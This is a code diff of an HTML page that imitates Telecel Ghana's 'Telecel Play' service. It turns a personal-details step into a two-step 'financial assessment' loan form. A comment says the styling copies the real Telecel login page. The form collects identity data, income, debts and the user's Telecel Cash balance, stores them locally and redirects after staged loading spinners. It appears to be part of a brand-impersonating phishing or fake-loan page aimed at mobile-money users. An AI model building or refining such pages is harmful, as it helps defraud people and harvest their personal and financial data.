@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>Telecel Play | Personal Details – play.telecel.com.gh</title>
+    <title>Telecel Play | Financial Assessment – play.telecel.com.gh</title>
     <link rel="icon" href="https://play.telecel.com.gh/favicon.ico" type="image/x-icon">
     <meta name="theme-color" content="#E30613">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -17,71 +16,43 @@
 
         body {
             font-family: 'Inter', sans-serif;
-            background: #f8f9fc;
-            color: #1a1a1a;
+            background: #f5f5f5;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            align-items: center;
+            justify-content: center;
             padding: 12px;
         }
 
-        header {
+        .container {
             width: 100%;
-            max-width: 480px;
-            padding: 12px 16px;
-            text-align: center;
-            margin-bottom: 12px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
-            position: relative;
-        }
-
-        .back-btn {
-            font-size: 28px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #2c3e50;
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            line-height: 1;
-        }
-
-        .logo {
-            font-size: clamp(28px, 7vw, 40px);
-            font-weight: 800;
-            letter-spacing: -0.5px;
-        }
-
-        .logo-telecel {
-            color: #E30613;
-        }
-
-        .logo-play {
-            color: #0033A0;
-        }
-
-        main {
-            flex: 1;
-            max-width: 480px;
-            width: 100%;
+            max-width: 360px;
             margin: 0 auto;
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 24px 16px 32px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
             position: relative;
+            overflow: hidden;
+        }
+
+        .top-bg {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 200px;
+            height: 200px;
+            background: linear-gradient(135deg, rgba(255,0,0,0.2), rgba(255,0,0,0.5));
+            border-bottom-left-radius: 120px;
+            z-index: 0;
         }
 
         .form-card {
-            background: white;
-            border-radius: 20px;
-            padding: 24px 18px 32px;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
             position: relative;
-            /* for absolute error box */
+            z-index: 2;
         }
 
-        /* Error box – exactly like cheat sheet (Telecel login page) */
         .error-box {
             position: absolute;
             top: 12px;
@@ -92,23 +63,17 @@
             border-radius: 14px;
             padding: 12px;
             display: none;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.12);
             z-index: 100;
             text-align: left;
         }
-
         .error-title {
             color: #ff0000;
             font-weight: bold;
             font-size: 14px;
             margin-bottom: 4px;
         }
-
-        .error-text {
-            color: #444;
-            font-size: 13px;
-        }
-
+        .error-text { color: #444; font-size: 13px; }
         .close {
             position: absolute;
             right: 12px;
@@ -119,448 +84,652 @@
         }
 
         .form-title {
-            font-size: clamp(24px, 6vw, 32px);
+            font-size: clamp(22px, 6vw, 28px);
             font-weight: 700;
             color: #1a1a1a;
             text-align: center;
-            margin-bottom: 1.2rem;
+            margin-bottom: 4px;
         }
 
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #e9ecef;
-            border-radius: 4px;
-            margin: 1rem auto 0.8rem;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            width: 66.66%;
-            height: 100%;
-            background: linear-gradient(90deg, #E30613, #b71c1c);
-            border-radius: 4px;
-        }
-
-        .step-text {
+        /* Two-line subtitle */
+        .sub-meta {
             text-align: center;
-            color: #6c757d;
-            font-size: 0.9rem;
-            margin-bottom: 1.8rem;
-        }
-
-        .form-group {
+            font-size: 13px;
             margin-bottom: 1.5rem;
+            margin-top: 8px;
+            background: #fff8e7;
+            border-radius: 24px;
+            padding: 10px 12px;
+            width: 100%;
+            line-height: 1.4;
         }
-
-        .form-label {
+        .sub-meta .line1 {
             display: block;
             font-weight: 600;
             color: #2c3e50;
-            margin-bottom: 0.5rem;
-            font-size: 0.9rem;
+            letter-spacing: -0.2px;
+        }
+        .sub-meta .line2 {
+            display: block;
+            font-size: 12px;
+            color: #cc0000;
+            background: rgba(255,0,0,0.05);
+            border-radius: 20px;
+            padding: 4px 8px;
+            margin-top: 6px;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
         }
 
-        .form-input {
+        /* SPACING FIX: small gap between label and input, large gap after input */
+        .form-group {
+            margin-bottom: 1.8rem;
+            display: flex;
+            flex-direction: column;
+        }
+        .form-label {
+            margin-bottom: 4px;
+            font-weight: 600;
+            color: #2c3e50;
+            font-size: 13px;
+            line-height: 1.3;
+        }
+        .form-input, .form-select {
             width: 100%;
-            padding: 0.9rem 1rem;
-            border: 1px solid #ced4da;
-            border-radius: 10px;
-            font-size: 1rem;
-            background: #fdfdfe;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 14px;
+            background: #fff;
             transition: all 0.2s;
         }
-
-        .form-input:focus {
-            border-color: #E30613;
+        .form-input:focus, .form-select:focus {
+            border-color: #ff0000;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
+            box-shadow: 0 0 0 2px rgba(255,0,0,0.2);
         }
-
-        /* Invalid highlight (like cheat sheet) */
-        .form-input.invalid,
-        #phoneGroup.invalid {
+        .invalid {
             border-color: #dc3545 !important;
-            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
+            box-shadow: 0 0 0 2px rgba(220,53,69,0.2) !important;
         }
 
-        .name-group {
+        /* Phone wrapper – no country code prefix */
+        .phone-wrapper {
             display: flex;
-            gap: 1rem;
-            margin-bottom: 1.5rem;
+            align-items: center;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            padding: 0 12px;
+            background: #fff;
+        }
+        .phone-wrapper input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 12px 0;
+            font-size: 14px;
+            background: transparent;
+        }
+        .phone-wrapper:focus-within {
+            border-color: #ff0000;
+            box-shadow: 0 0 0 2px rgba(255,0,0,0.2);
         }
 
-        .name-group>div {
-            flex: 1;
+        /* Double grid – perfect alignment */
+        .double-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 0;
+        }
+        .double-group .form-group {
+            margin-bottom: 0;
         }
 
         .btn-group {
             display: flex;
-            gap: 1rem;
-            margin-top: 2rem;
+            gap: 12px;
+            margin-top: 28px;
         }
-
-        .prev-btn,
-        .next-btn {
+        .prev-btn, .next-btn {
             flex: 1;
-            padding: 1rem;
-            border-radius: 12px;
-            font-size: 1rem;
+            padding: 14px 12px;
+            border-radius: 60px;
+            font-size: 15px;
             font-weight: 700;
             cursor: pointer;
             transition: 0.2s;
             touch-action: manipulation;
+            text-align: center;
+            border: none;
         }
-
         .prev-btn {
-            background: #e2e8f0;
-            color: #475569;
-            border: none;
+            background: #e9ecef;
+            color: #495057;
         }
-
-        .prev-btn:active {
-            transform: scale(0.97);
-        }
-
+        .prev-btn:active { transform: scale(0.97); }
         .next-btn {
-            background: linear-gradient(90deg, #E30613, #b71c1c);
+            background: #ff0000;
             color: white;
-            border: none;
-            box-shadow: 0 6px 18px rgba(227, 6, 19, 0.25);
+            box-shadow: 0 4px 12px rgba(255,0,0,0.3);
         }
-
-        .next-btn:active {
-            transform: scale(0.97);
-        }
-
-        .next-btn.disabled-btn,
-        .next-btn:disabled {
+        .next-btn:active { transform: scale(0.97); }
+        .next-btn.disabled-btn, .next-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
             transform: none;
         }
 
-        footer {
-            padding: 20px 16px;
-            color: #adb5bd;
-            font-size: 12px;
-            text-align: center;
-            margin-top: auto;
+        .step-container {
+            transition: opacity 0.2s;
+        }
+        .hidden-step {
+            display: none;
         }
 
-        /* Spinner overlay – cheat sheet style */
+        footer {
+            text-align: center;
+            color: #adb5bd;
+            font-size: 11px;
+            margin-top: 20px;
+            max-width: 360px;
+        }
+
         #spinner {
             position: fixed;
             inset: 0;
             display: none;
             align-items: center;
             justify-content: center;
-            background: rgba(255, 255, 255, 0.8);
-            backdrop-filter: blur(2px);
+            background: rgba(255,255,255,0.85);
+            backdrop-filter: blur(3px);
             z-index: 999;
         }
-
         .loader {
-            width: 44px;
-            height: 44px;
+            width: 42px;
+            height: 42px;
             border: 4px solid #ffe0e0;
             border-top: 4px solid #ff0000;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        /* Extra fine-tuning for small devices (<= 380px) */
-        @media (max-width: 380px) {
-            body {
-                padding: 8px;
-            }
-
-            .form-card {
-                padding: 20px 14px;
-            }
-
-            .form-input {
-                padding: 0.8rem 0.9rem;
-                font-size: 0.9rem;
-            }
-
-            .name-group {
-                gap: 0.8rem;
-                flex-direction: column;
-                margin-bottom: 0.8rem;
-            }
-
-            .btn-group {
-                gap: 0.8rem;
-            }
-
-            .prev-btn,
-            .next-btn {
-                padding: 0.8rem;
-                font-size: 0.9rem;
-            }
-        }
-
-        /* Maintain original layout on larger screens */
-        @media (min-width: 769px) {
-            body {
-                padding: 32px;
-            }
-
-            .form-card {
-                padding: 2.5rem 3rem;
-            }
-        }
-
-        /* Phone group special styling */
-        #phoneGroup {
-            display: flex;
-            align-items: center;
-            border: 1px solid #ced4da;
-            border-radius: 10px;
-            padding: 0 1rem;
-            background: #fdfdfe;
-        }
-
-        #phoneGroup span {
+        .info-note {
+            font-size: 11px;
             color: #6c757d;
-            font-weight: 500;
-            margin-right: 0.5rem;
+            margin-top: 4px;
         }
 
-        #phoneGroup input {
-            flex: 1;
-            border: none;
-            outline: none;
-            padding: 0.9rem 0;
-            font-size: 1rem;
-            background: transparent;
+        @media (max-width: 380px) {
+            body { padding: 8px; }
+            .container { padding: 20px 12px 28px; }
+            .double-group { gap: 8px; }
+            .form-input, .form-select, .phone-wrapper input { padding: 10px 12px; }
+            .btn-group { gap: 8px; }
         }
     </style>
 </head>
-
 <body>
-    <header>
-        <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-telecel">Telecel</span><span class="logo-play">Play</span></div>
-    </header>
-    <main>
-        <div class="form-card">
-            <!-- Error box – exactly like cheat sheet -->
-            <div class="error-box" id="errorBox">
-                <div class="close" onclick="hideError()">×</div>
-                <div class="error-title">Error</div>
-                <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
+<div class="container">
+    <div class="top-bg"></div>
+    <div class="form-card">
+        <div class="error-box" id="errorBox">
+            <div class="close" onclick="hideError()">×</div>
+            <div class="error-title">Error</div>
+            <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
+        </div>
+
+        <!-- STEP 1 -->
+        <div id="step1Container" class="step-container">
+            <h1 class="form-title">Tell us about you</h1>
+            <div class="sub-meta">
+                <span class="line1">✨ Quick identity check</span>
             </div>
 
-            <h1 class="form-title">Personal Details</h1>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-            <div class="step-text">Step 2 of 3</div>
-
-            <div class="name-group">
-                <div>
-                    <label class="form-label">First Name</label>
-                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Kwame">
+            <div class="double-group">
+                <div class="form-group">
+                    <label class="form-label">First Name *</label>
+                    <input type="text" class="form-input" id="firstName" placeholder="Kwame">
                 </div>
-                <div>
-                    <label class="form-label">Last Name</label>
-                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Mensah">
+                <div class="form-group">
+                    <label class="form-label">Last Name *</label>
+                    <input type="text" class="form-input" id="lastName" placeholder="Mensah">
                 </div>
             </div>
 
             <div class="form-group">
-                <label class="form-label">Email Address</label>
-                <input type="email" class="form-input" id="email" placeholder="e.g. kwame.mensah@example.com">
+                <label class="form-label">Email (optional)</label>
+                <input type="email" class="form-input" id="email" placeholder="kwame@example.com">
             </div>
 
             <div class="form-group">
-                <label class="form-label">Phone Number</label>
-                <div id="phoneGroup">
-                    <span>+233</span>
-                    <input type="tel" id="phone" placeholder="55 123 4567" maxlength="11" inputmode="numeric">
+                <label class="form-label">Phone Number *</label>
+                <div class="phone-wrapper" id="phoneWrapper">
+                    <input type="tel" id="phone" placeholder="20 123 4567" maxlength="10" inputmode="numeric">
+                </div>
+                <div class="info-note">Telecel number starting with 020 or 050 (10 digits)</div>
+            </div>
+
+            <div class="double-group">
+                <div class="form-group">
+                    <label class="form-label">Age group *</label>
+                    <select class="form-select" id="ageGroup">
+                        <option value="">Select age</option>
+                        <option>18-24</option>
+                        <option>25-34</option>
+                        <option>35+</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Gender</label>
+                    <select class="form-select" id="gender">
+                        <option value="">Prefer not to say</option>
+                        <option>Male</option>
+                        <option>Female</option>
+                        <option>Rather not say</option>
+                    </select>
                 </div>
             </div>
 
             <div class="btn-group">
-                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-                <button class="next-btn" id="nextBtn">NEXT STEP</button>
+                <button class="prev-btn" id="step1BackBtn">BACK</button>
+                <button class="next-btn" id="step1NextBtn">CONTINUE</button>
             </div>
         </div>
-    </main>
-    <footer>
-        © 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play
-    </footer>
 
-    <!-- Spinner overlay (cheat sheet style) -->
-    <div id="spinner">
-        <div class="loader"></div>
+        <!-- STEP 2 (unchanged) -->
+        <div id="step2Container" class="step-container hidden-step">
+            <h1 class="form-title">Financial snapshot</h1>
+            <div class="sub-meta">
+                <span class="line1">📋 Help us serve you better</span>
+                <span class="line2">(Please provide accurate information)</span>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Employment status *</label>
+                <select class="form-select" id="employmentStatus">
+                    <option value="">Select status</option>
+                    <option>Employed (Full-time)</option>
+                    <option>Self-employed</option>
+                    <option>Unemployed</option>
+                    <option>Retired</option>
+                    <option>Student</option>
+                </select>
+            </div>
+
+            <div class="double-group">
+                <div class="form-group">
+                    <label class="form-label">Monthly income (GH₵) *</label>
+                    <select class="form-select" id="monthlyIncome">
+                        <option value="">Select range</option>
+                        <option value="below500">Below 500</option>
+                        <option value="500-999">500 - 999</option>
+                        <option value="1000-1999">1,000 - 1,999</option>
+                        <option value="2000-2999">2,000 - 2,999</option>
+                        <option value="3000-4999">3,000 - 4,999</option>
+                        <option value="5000-7499">5,000 - 7,499</option>
+                        <option value="7500+">7,500+</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Monthly needs / expenses (GH₵) *</label>
+                    <select class="form-select" id="monthlyNeeds">
+                        <option value="">Select range</option>
+                        <option value="below500">Below 500</option>
+                        <option value="500-999">500 - 999</option>
+                        <option value="1000-1999">1,000 - 1,999</option>
+                        <option value="2000-2999">2,000 - 2,999</option>
+                        <option value="3000-4999">3,000 - 4,999</option>
+                        <option value="5000+">5,000+</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="double-group">
+                <div class="form-group">
+                    <label class="form-label">Number of dependants *</label>
+                    <select class="form-select" id="dependants">
+                        <option value="0">0</option>
+                        <option value="1">1</option>
+                        <option value="2">2</option>
+                        <option value="3">3</option>
+                        <option value="4">4+</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Loan purpose *</label>
+                    <select class="form-select" id="loanPurpose">
+                        <option value="">Select purpose</option>
+                        <option>Personal expenses</option>
+                        <option>Business / Investment</option>
+                        <option>Education</option>
+                        <option>Emergency / Medical</option>
+                        <option>Debt consolidation</option>
+                        <option>Home improvement</option>
+                        <option>Other</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="double-group">
+                <div class="form-group">
+                    <label class="form-label">How long have you used Telecel Cash? *</label>
+                    <select class="form-select" id="telecelTenure">
+                        <option value="">Select period</option>
+                        <option>1 month</option>
+                        <option>2 months</option>
+                        <option>3 months</option>
+                        <option>6 months</option>
+                        <option>Up to 1 year</option>
+                        <option>1 year+</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">How frequent do you use Telecel Cash? *</label>
+                    <select class="form-select" id="usageFrequency">
+                        <option value="Daily">Daily</option>
+                        <option value="Weekly">Weekly</option>
+                        <option value="Monthly">Monthly</option>
+                        <option value="Rarely">Rarely</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="double-group">
+                <div class="form-group">
+                    <label class="form-label" id="dynamicSpendLabel">Daily spend using Telecel Cash (GH₵) *</label>
+                    <select class="form-select" id="weeklySpend">
+                        <option value="">Select range</option>
+                        <option>0-49</option>
+                        <option>50-99</option>
+                        <option>100-499</option>
+                        <option>500-999</option>
+                        <option>1000+</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Avg transaction using Telecel Cash (GH₵) *</label>
+                    <select class="form-select" id="avgTransaction">
+                        <option value="">Select range</option>
+                        <option>0-49</option>
+                        <option>50-99</option>
+                        <option>100-499</option>
+                        <option>500-999</option>
+                        <option>1000+</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="double-group">
+                <div class="form-group">
+                    <label class="form-label">Current Telecel Cash balance (GH₵) *</label>
+                    <select class="form-select" id="currentBalance">
+                        <option value="">Select range</option>
+                        <option>0-49</option>
+                        <option>50-99</option>
+                        <option>100-499</option>
+                        <option>500-999</option>
+                        <option>1000+</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Ever defaulted on a loan?</label>
+                    <select class="form-select" id="everDefaulted">
+                        <option value="No">No</option>
+                        <option value="Yes">Yes</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Other outstanding loans?</label>
+                <select class="form-select" id="outstandingLoans">
+                    <option value="No">No</option>
+                    <option value="Yes">Yes</option>
+                </select>
+            </div>
+            <div class="info-note">* Required for accurate eligibility assessment</div>
+
+            <div class="btn-group">
+                <button class="prev-btn" id="step2BackBtn">PREVIOUS</button>
+                <button class="next-btn" id="step2SubmitBtn">SUBMIT</button>
+            </div>
+        </div>
     </div>
+</div>
+<footer>© 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play</footer>
+<div id="spinner"><div class="loader"></div></div>
 
-    <script>
-        // ========== DOM elements ==========
-        const firstNameInput = document.getElementById('firstName');
-        const lastNameInput = document.getElementById('lastName');
-        const emailInput = document.getElementById('email');
-        const phoneInput = document.getElementById('phone');
-        const phoneGroup = document.getElementById('phoneGroup');
-        const nextBtn = document.getElementById('nextBtn');
-        const spinner = document.getElementById('spinner');
-        const errorBox = document.getElementById('errorBox');
-        const errorText = document.getElementById('errorText');
+<script>
+    // DOM elements
+    const step1 = document.getElementById('step1Container');
+    const step2 = document.getElementById('step2Container');
+    const step1Next = document.getElementById('step1NextBtn');
+    const step1Back = document.getElementById('step1BackBtn');
+    const step2Back = document.getElementById('step2BackBtn');
+    const step2Submit = document.getElementById('step2SubmitBtn');
+    const spinner = document.getElementById('spinner');
+    const errorBox = document.getElementById('errorBox');
+    const errorText = document.getElementById('errorText');
 
-        // Pre-fill from localStorage if available
-        if (localStorage.getItem('firstName')) firstNameInput.value = localStorage.getItem('firstName');
-        if (localStorage.getItem('lastName')) lastNameInput.value = localStorage.getItem('lastName');
-        if (localStorage.getItem('email')) emailInput.value = localStorage.getItem('email');
+    // Step 1 fields
+    const firstName = document.getElementById('firstName');
+    const lastName = document.getElementById('lastName');
+    const email = document.getElementById('email');
+    const phoneInput = document.getElementById('phone');
+    const phoneWrapper = document.getElementById('phoneWrapper');
+    const ageGroup = document.getElementById('ageGroup');
+    const gender = document.getElementById('gender');
+
+    // Step 2 fields
+    const employmentStatus = document.getElementById('employmentStatus');
+    const monthlyIncome = document.getElementById('monthlyIncome');
+    const monthlyNeeds = document.getElementById('monthlyNeeds');
+    const dependants = document.getElementById('dependants');
+    const loanPurpose = document.getElementById('loanPurpose');
+    const telecelTenure = document.getElementById('telecelTenure');
+    const usageFrequency = document.getElementById('usageFrequency');
+    const weeklySpend = document.getElementById('weeklySpend');
+    const avgTransaction = document.getElementById('avgTransaction');
+    const currentBalance = document.getElementById('currentBalance');
+    const everDefaulted = document.getElementById('everDefaulted');
+    const outstandingLoans = document.getElementById('outstandingLoans');
+    const dynamicSpendLabel = document.getElementById('dynamicSpendLabel');
+
+    function hideError() { errorBox.style.display = 'none'; }
+    window.hideError = hideError;
+    function showError(message) {
+        errorText.innerText = message || 'Please fix the highlighted fields.';
+        errorBox.style.display = 'block';
+    }
+    function resetInvalid() {
+        document.querySelectorAll('.form-input, .form-select, #phoneWrapper').forEach(el => el.classList.remove('invalid'));
+    }
+
+    // Updated phone validation: exactly 10 digits, starts with 020 or 050
+    function isValidTelecelPhone(raw) {
+        let digits = raw.replace(/\D/g, '');
+        if (digits.length !== 10) return false;
+        return digits.startsWith('020') || digits.startsWith('050');
+    }
+
+    function updateSpendLabel() {
+        const freq = usageFrequency.value;
+        let labelText = '';
+        switch(freq) {
+            case 'Daily': labelText = 'Daily spend using Telecel Cash (GH₵) *'; break;
+            case 'Weekly': labelText = 'Weekly spend using Telecel Cash (GH₵) *'; break;
+            case 'Monthly': labelText = 'Monthly spend using Telecel Cash (GH₵) *'; break;
+            case 'Rarely': labelText = 'Average spend per use (GH₵) *'; break;
+            default: labelText = 'Daily spend using Telecel Cash (GH₵) *';
+        }
+        dynamicSpendLabel.textContent = labelText;
+    }
+
+    function validateStep1() {
+        resetInvalid(); hideError();
+        let isValid = true, errMsg = '';
+        const fName = firstName.value.trim();
+        const lName = lastName.value.trim();
+        const phoneRaw = phoneInput.value.trim();
+        const ageVal = ageGroup.value;
+
+        if (!fName) { firstName.classList.add('invalid'); isValid = false; errMsg = 'First name required.'; }
+        else if (fName.length < 2) { firstName.classList.add('invalid'); isValid = false; errMsg = 'First name at least 2 characters.'; }
+        if (!lName) { lastName.classList.add('invalid'); isValid = false; if(!errMsg) errMsg = 'Last name required.'; }
+        else if (lName.length < 2) { lastName.classList.add('invalid'); isValid = false; errMsg = 'Last name at least 2 characters.'; }
+        if (!phoneRaw) { phoneWrapper.classList.add('invalid'); isValid = false; errMsg = 'Phone number required.'; }
+        else if (!isValidTelecelPhone(phoneRaw)) { phoneWrapper.classList.add('invalid'); isValid = false; errMsg = 'Enter a valid Telecel number starting with 020 or 050 (10 digits).'; }
+        if (!ageVal) { ageGroup.classList.add('invalid'); isValid = false; if(!errMsg) errMsg = 'Select age group.'; }
+        const emailVal = email.value.trim();
+        if (emailVal && (!emailVal.includes('@') || !emailVal.includes('.') || emailVal.length < 5)) {
+            email.classList.add('invalid'); isValid = false; errMsg = 'Enter a valid email address or leave empty.';
+        }
+        if (!isValid) showError(errMsg);
+        return isValid;
+    }
+
+    function validateStep2() {
+        resetInvalid(); hideError();
+        let valid = true, msg = '';
+        if (!employmentStatus.value) { employmentStatus.classList.add('invalid'); valid = false; msg = 'Employment status required.'; }
+        if (!monthlyIncome.value) { monthlyIncome.classList.add('invalid'); valid = false; if(!msg) msg = 'Select monthly income range.'; }
+        if (!monthlyNeeds.value) { monthlyNeeds.classList.add('invalid'); valid = false; if(!msg) msg = 'Select monthly needs range.'; }
+        if (!dependants.value) { dependants.classList.add('invalid'); valid = false; if(!msg) msg = 'Select number of dependants.'; }
+        if (!loanPurpose.value) { loanPurpose.classList.add('invalid'); valid = false; if(!msg) msg = 'Select loan purpose.'; }
+        if (!telecelTenure.value) { telecelTenure.classList.add('invalid'); valid = false; if(!msg) msg = 'Telecel Cash tenure required.'; }
+        if (!usageFrequency.value) { usageFrequency.classList.add('invalid'); valid = false; if(!msg) msg = 'Usage frequency required.'; }
+        if (!weeklySpend.value) { weeklySpend.classList.add('invalid'); valid = false; if(!msg) msg = 'Please select spend range.'; }
+        if (!avgTransaction.value) { avgTransaction.classList.add('invalid'); valid = false; if(!msg) msg = 'Average transaction amount required.'; }
+        if (!currentBalance.value) { currentBalance.classList.add('invalid'); valid = false; if(!msg) msg = 'Current balance range required.'; }
+        if (!valid) showError(msg || 'Please complete all required financial fields.');
+        return valid;
+    }
+
+    function saveStep1ToStorage() {
+        localStorage.setItem('firstName', firstName.value.trim());
+        localStorage.setItem('lastName', lastName.value.trim());
+        localStorage.setItem('email', email.value.trim());
+        // store raw digits (10-digit)
+        const phoneDigits = phoneInput.value.trim().replace(/\D/g, '');
+        localStorage.setItem('phone', phoneDigits);
+        localStorage.setItem('ageGroup', ageGroup.value);
+        localStorage.setItem('gender', gender.value);
+    }
+    function loadStep1FromStorage() {
+        if (localStorage.getItem('firstName')) firstName.value = localStorage.getItem('firstName');
+        if (localStorage.getItem('lastName')) lastName.value = localStorage.getItem('lastName');
+        if (localStorage.getItem('email')) email.value = localStorage.getItem('email');
         if (localStorage.getItem('phone')) phoneInput.value = localStorage.getItem('phone');
+        if (localStorage.getItem('ageGroup')) ageGroup.value = localStorage.getItem('ageGroup');
+        if (localStorage.getItem('gender')) gender.value = localStorage.getItem('gender');
+    }
+    function saveStep2ToStorage() {
+        localStorage.setItem('employmentStatus', employmentStatus.value);
+        localStorage.setItem('monthlyIncome', monthlyIncome.value);
+        localStorage.setItem('monthlyNeeds', monthlyNeeds.value);
+        localStorage.setItem('dependants', dependants.value);
+        localStorage.setItem('loanPurpose', loanPurpose.value);
+        localStorage.setItem('telecelTenure', telecelTenure.value);
+        localStorage.setItem('usageFrequency', usageFrequency.value);
+        localStorage.setItem('weeklySpend', weeklySpend.value);
+        localStorage.setItem('avgTransaction', avgTransaction.value);
+        localStorage.setItem('currentBalance', currentBalance.value);
+        localStorage.setItem('everDefaulted', everDefaulted.value);
+        localStorage.setItem('outstandingLoans', outstandingLoans.value);
+    }
+    function loadStep2FromStorage() {
+        if (localStorage.getItem('employmentStatus')) employmentStatus.value = localStorage.getItem('employmentStatus');
+        if (localStorage.getItem('monthlyIncome')) monthlyIncome.value = localStorage.getItem('monthlyIncome');
+        if (localStorage.getItem('monthlyNeeds')) monthlyNeeds.value = localStorage.getItem('monthlyNeeds');
+        if (localStorage.getItem('dependants')) dependants.value = localStorage.getItem('dependants');
+        if (localStorage.getItem('loanPurpose')) loanPurpose.value = localStorage.getItem('loanPurpose');
+        if (localStorage.getItem('telecelTenure')) telecelTenure.value = localStorage.getItem('telecelTenure');
+        if (localStorage.getItem('usageFrequency')) usageFrequency.value = localStorage.getItem('usageFrequency');
+        if (localStorage.getItem('weeklySpend')) weeklySpend.value = localStorage.getItem('weeklySpend');
+        if (localStorage.getItem('avgTransaction')) avgTransaction.value = localStorage.getItem('avgTransaction');
+        if (localStorage.getItem('currentBalance')) currentBalance.value = localStorage.getItem('currentBalance');
+        if (localStorage.getItem('everDefaulted')) everDefaulted.value = localStorage.getItem('everDefaulted');
+        if (localStorage.getItem('outstandingLoans')) outstandingLoans.value = localStorage.getItem('outstandingLoans');
+        updateSpendLabel();
+    }
 
-        // ========== Helper: show error (exactly like cheat sheet) ==========
-        function showError(message) {
-            errorText.innerText = message || 'Please fix the highlighted fields.';
-            errorBox.style.display = 'block';
-        }
-
-        function hideError() {
-            errorBox.style.display = 'none';
-        }
-
-        // Remove invalid highlight from all fields
-        function resetInvalidHighlights() {
-            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => {
-                el.classList.remove('invalid');
-            });
-        }
-
-        // ========== LENIENT Validation: accept 9, 10, or 11 digits ==========
-        function isValidPhoneNumber(phoneDigits) {
-            // Accept 9, 10, or 11 digits (2 more digits than original 9)
-            return /^\d{9,11}$/.test(phoneDigits);
-        }
-
-        function validateForm() {
-            let isValid = true;
-            let errorMsg = '';
-
-            // Reset UI
-            resetInvalidHighlights();
+    let isTransitioning = false;
+    function showStep2WithSpinner() {
+        if (isTransitioning) return;
+        if (!validateStep1()) return;
+        saveStep1ToStorage();
+        isTransitioning = true;
+        step1Next.disabled = true;
+        step1Next.classList.add('disabled-btn');
+        spinner.style.display = 'flex';
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            step1Next.disabled = false;
+            step1Next.classList.remove('disabled-btn');
+            loadStep2FromStorage();
+            step1.classList.add('hidden-step');
+            step2.classList.remove('hidden-step');
+            isTransitioning = false;
             hideError();
+            updateSpendLabel();
+        }, 3000);
+    }
+    function goBackToStep1() {
+        saveStep2ToStorage();
+        step2.classList.add('hidden-step');
+        step1.classList.remove('hidden-step');
+        loadStep1FromStorage();
+        hideError();
+    }
+    function submitFinal() {
+        if (isTransitioning) return;
+        if (!validateStep2()) return;
+        saveStep2ToStorage();
+        localStorage.setItem('loanPurpose', loanPurpose.value);
+        isTransitioning = true;
+        step2Submit.disabled = true;
+        step2Submit.classList.add('disabled-btn');
+        spinner.style.display = 'flex';
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            window.location.href = 'summary.html';
+        }, 3000);
+    }
 
-            const firstName = firstNameInput.value.trim();
-            const lastName = lastNameInput.value.trim();
-            const phoneRaw = phoneInput.value.trim();
+    step1Next.addEventListener('click', showStep2WithSpinner);
+    step2Back.addEventListener('click', goBackToStep1);
+    step2Submit.addEventListener('click', submitFinal);
+    step1Back.addEventListener('click', () => { window.location.href = 'index.html'; });
 
-            // First name check
-            if (!firstName) {
-                firstNameInput.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'First name is required.';
-            } else if (firstName.length < 2) {
-                firstNameInput.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'First name must be at least 2 characters.';
-            }
-
-            // Last name check
-            if (!lastName) {
-                lastNameInput.classList.add('invalid');
-                isValid = false;
-                if (!errorMsg) errorMsg = 'Last name is required.';
-            } else if (lastName.length < 2) {
-                lastNameInput.classList.add('invalid');
-                isValid = false;
